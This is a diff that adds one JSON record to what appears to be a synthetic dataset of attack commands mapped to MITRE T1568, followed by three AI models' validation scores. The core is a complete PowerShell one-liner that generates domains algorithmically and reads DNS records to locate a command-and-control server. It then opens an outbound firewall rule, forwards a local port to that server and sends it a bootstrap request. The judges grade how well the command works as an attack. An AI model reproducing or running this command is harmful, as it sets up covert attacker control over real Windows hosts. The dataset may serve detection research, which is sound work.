@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$seed='net';$date=(Get-Date -Format 'yyyyMMdd');$dgad=1..40|%{('gw{0}-{1}.org' -f $_,$date)};foreach($d in $dgad){try{$a=Resolve-DnsName $d -Type A -ErrorAction Stop;$t=Resolve-DnsName $d -Type TXT -ErrorAction SilentlyContinue;$port=([regex]::Match(($t.Strings -join ''),'p=(\\d{2,5})')).Groups[1].Value;if(!$port){$port=(Get-Random -Min 40000 -Max 50000)};$ip=($a|Get-Random).IPAddress;netsh interface portproxy set v4tov4 listenaddress=127.0.0.1 listenport=$port connectaddress=$ip connectport=$port;netsh advfirewall firewall add rule name='c2_dyn_'+$port dir=out action=allow protocol=TCP remoteip=$ip remoteport=$port;Invoke-WebRequest -Uri ('http://127.0.0.1:'+ $port +'/boot') -UseBasicParsing -Headers @{XD=$d} -TimeoutSec 5;break}catch{}}",
+  "explanation": "Uses DGA plus TXT records to dynamically derive the C2 port, resolves the A record for an IP, then sets a matching portproxy and sends a staging request.",
+  "rationale_steps": [
+    "Resolve TXT to extract a dynamic port and A record for IP binding.",
+    "Map local listener to the dynamic endpoint and initiate C2 bootstrap."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-663213d4",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid flag formats, and appropriate error handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1568 (Dynamic Resolution) by generating domain names algorithmically based on date, resolving DNS records to find C2 servers, extracting configuration from TXT records, and establishing communication through port forwarding.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:01:24.107247Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced syntax, valid cmdlet usage, correct pipeline operations, and proper external command invocation.",
+        "semantic_score": 3,
+        "semantic_justification": "The command perfectly demonstrates dynamic resolution (DGA for domains, DNS queries for IPs and TXT records for ports), but the critical 'netsh' commands for port proxy and firewall rules require administrator privileges, contradicting the stated 'Privilege: None' and preventing the full C2 setup.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:01:34.839556Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell is balanced and parseable with valid cmdlets, operators, and control flow, and no quoting or bracket mismatches.",
+        "semantic_score": 4,
+        "semantic_justification": "It credibly implements dynamic resolution via a date-based DGA and TXT-derived port selection (aligning with T1568), but the netsh portproxy/firewall steps likely require elevation and the argument construction for netsh (e.g., name='c2_dyn_'+$port) may not pass as intended, reducing operational plausibility.",
+        "combined_score": 4.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T07:03:57.838948Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
